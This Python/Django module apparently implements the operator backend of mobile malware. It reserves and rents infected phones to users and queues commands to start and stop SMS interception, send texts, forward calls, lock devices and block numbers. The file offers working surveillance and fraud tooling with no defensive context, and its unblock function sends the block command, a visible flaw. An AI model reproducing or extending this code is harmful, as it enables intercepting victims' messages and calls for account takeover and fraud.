import logging

from django.conf import settings
from django.db.transaction import atomic

import command_queue
import models


logger = logging.getLogger(__name__)

PHONE_STATE_STABLE = 0
""" Phone is in a stable state """
PHONE_STATE_LOCKING = 1
""" Phone is being locked currently """
PHONE_STATE_UNLOCKING = 2
""" Phone is unlocking """

FORMAT_TRANSIENT_STATE = "state:{0}"


def set_phone_transient_state(unique_id, state):
    """
    Sets a flag for transient phone state
    @param unique_id: Phone unique ID
    @type unique_id: basestring
    @param state: Transient state, one of PHONE_STATE_* constants
    @type state: int
    """
    settings.REDIS.set(FORMAT_TRANSIENT_STATE.format(unique_id), state)


def get_phone_transient_state(unique_id):
    """
    Get a transient state flag for the phone
    @param unique_id: Phone unique ID
    @type unique_id: basestring
    @return: Phone state flag, one of PHONE_STATE_* constants
    @rtype: int
    """
    v = settings.REDIS.get(FORMAT_TRANSIENT_STATE.format(unique_id))
    if v is None:
        return PHONE_STATE_STABLE
    return int(v)


@atomic
def reserve_phone(user, phone):
    """
    Attempt reserving phone for the given user. Sends command to the phone
    @param user: User to connect this phone to
    @type user: User
    @param phone: Phone data to process
    @type phone: PhoneData
    @return: True if successful or has been reserved for this user already, False otherwise
    @rtype: bool
    """
    if phone.owner == user:
        return True
    if phone.owner is not None and phone.owner != user:
        return False
    phone.owner = user
    phone.sms_status = models.PhoneData.SMS_INITIAL
    phone.save()
    set_phone_transient_state(phone.uniq_id, PHONE_STATE_LOCKING)
    command_queue.add_command(phone.uniq_id, user, "#intercept_sms_start")
    logger.debug("Phone {0} is going to be assigned to the user {1}".format(phone, user))
    return True


@atomic
def release_phone(phone):
    """
    Releases the phone from the user control
    @param phone: Phone to process
    @type phone: PhoneData
    @rtype: None
    """
    if phone.owner_id is None:
        return
    phone.sms_status = models.PhoneData.SMS_INITIAL
    phone.save()
    set_phone_transient_state(phone.uniq_id, PHONE_STATE_UNLOCKING)
    command_queue.add_command(phone.uniq_id, None, "#intercept_sms_stop")
    logger.debug("Phone {0} to be released".format(phone))


def device_lock(phone, status):
    """
    Lock/unlock given device
    @param phone: Phone to process
    @type phone: PhoneData
    @param status: Lock status
    @type status: bool
    @rtype: None
    """
    if phone.locked and not status:
        command_queue.add_command(phone.uniq_id, None, "#unlock")
    elif not phone.locked and status:
        command_queue.add_command(phone.uniq_id, None, "#lock")


def send_id(phone, number):
    """
    Send ID
    @param phone: the phone to check
    @type phone: PhoneData
    @param number: phone # to use
    @type number: basestring
    """
    command_queue.add_command(phone.uniq_id, None, "#sentid {0}".format(number))
    logger.debug("Sending id to {0} via {1}".format(phone, number))


def send_sms(phone, smsto, text):
    """
    Send SMS to specified recipient
    @param phone: the phone object
    @type phone: PhoneData
    @param smsto: SMS recipient
    @type smsto: basestring
    @param text: SMS text
    @type text: basestring
    """
    logger.debug(u"Phone {0} is sending SMS to {1} text {2}".format(phone, smsto, text))
    command_queue.add_command(phone.uniq_id, None, u"#send_sms {0} {1}".format(smsto, text))


def forward_calls(phone, number):
    """
    Start forwarding phone calls to another #
    @param phone: the phone object
    @type phone: PhoneData
    @param number: new number
    @type number: basestring
    """
    logger.debug("Forwarding phone {0} calls to {1}".format(phone, number))
    command_queue.add_command(phone.uniq_id, None, "#forward_calls {0}".format(number))


def disable_forward_calls(phone):
    """
    Stop forwarding phone calls
    @param phone: the phone object
    @type phone: PhoneData
    """
    logger.debug("Stopping call forwarding for phone {0}".format(phone))
    command_queue.add_command(phone.uniq_id, None, "#disable_forward_calls")


def unblock_phone(phone, number):
    """
    Unblock specified number from this phone
    @param phone: the phone object
    @type phone: PhoneData
    @param number: Number to unblock
    """
    logger.debug("Phone {0} sent command to release blocked number {1}".format(phone, number))
    command_queue.add_command(phone.uniq_id, None, "#block_numbers {0}".format(number))


def block_phone(phone, number):
    """
    Block specified number at this phone
    @param phone: the phone object
    @type phone: PhoneData
    @param number: Number to block
    """
    logger.debug("Phone {0} sent command to add blocked number {1}".format(phone, number))
    command_queue.add_command(phone.uniq_id, None, "#block_numbers {0}".format(number))


def unblock_all(phone):
    """
    Unblock all numbers for a specifed phone
    @param phone: the phone object
    @type phone: PhoneData
    """
    logger.debug("Phone {0} sent command to release all blocked numbers".format(phone))
    command_queue.add_command(phone.uniq_id, None, "#unblock_all_numbers")


FORMAT_PHONE_LOCK = "lock:{0}"


def touch_phone(code):
    """
    Creates/refreshes flag in Redis cache that signals that the phone is in use by UI
    @param code: Phone unique ID
    """
    settings.REDIS.setex(FORMAT_PHONE_LOCK.format(code), 1, 60)


def cleanup_rented_phones():
    """
    Finds which rented phones haven't been touched for a while and sends a command to release them

    """
    for p in models.PhoneData.objects.exclude(owner_id__isnull=True).exclude(sms_status=models.PhoneData.SMS_INITIAL):
        # check if the phone is in use:
        if settings.REDIS.get(FORMAT_PHONE_LOCK.format(p.uniq_id)):
            # keep it locked
            continue
        # check if the phone is not being locked/unlocked currently
        if get_phone_transient_state(p.uniq_id) == PHONE_STATE_STABLE:
            # release it
            release_phone(p)
